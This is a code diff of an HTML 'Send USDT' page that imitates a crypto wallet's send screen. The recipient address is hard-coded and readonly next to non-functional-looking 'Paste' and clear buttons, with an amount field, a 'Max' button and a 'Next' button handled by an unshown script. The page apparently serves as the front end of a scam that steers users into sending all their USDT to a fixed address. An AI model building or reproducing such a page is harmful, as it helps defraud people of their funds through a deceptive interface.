@@ -1,31 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1"user-scalable="no"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Send USDT</title>
-  <link rel="stylesheet" href="style.css" />
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script defer src="script.js"></script>
+  <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
   <div class="container">
-    <label>Address or Domain Name</label>
-    <div class="input-group">
-      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly />
-      <button type="button" onclick="clearAddress()">✕</button>
-      <button type="button" onclick="pasteAddress()">Paste</button>
-    </div>
+    <form>
+      <label for="address">Address or Domain Name</label>
+      <div class="input-wrapper">
+        <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
+        <button type="button" id="clearBtn">&#10005;</button>
+        <button type="button" id="pasteBtn">Paste</button>
+      </div>
 
-    <label>Amount</label>
-    <div class="input-group">
-      <input type="number" id="amount" placeholder="0" />
-      <span>USDT</span>
-      <button type="button" onclick="setMaxAmount()">Max</button>
-    </div>
-    <p id="usdValue">= $0.00</p>
+      <label for="amount">Amount</label>
+      <div class="input-wrapper">
+        <input type="number" id="amount" placeholder="USDT Amount">
+        <span class="suffix">USDT</span>
+        <button type="button" id="maxBtn">Max</button>
+      </div>
+      <p id="usdValue">&asymp; $0.00</p>
 
-    <button class="next-button" onclick="transferFunds()">Next</button>
+      <button type="button" id="sendBtn">Next</button>
+    </form>
   </div>
+
+  <script src="script.js"></script>
 </body>
+
 </html>
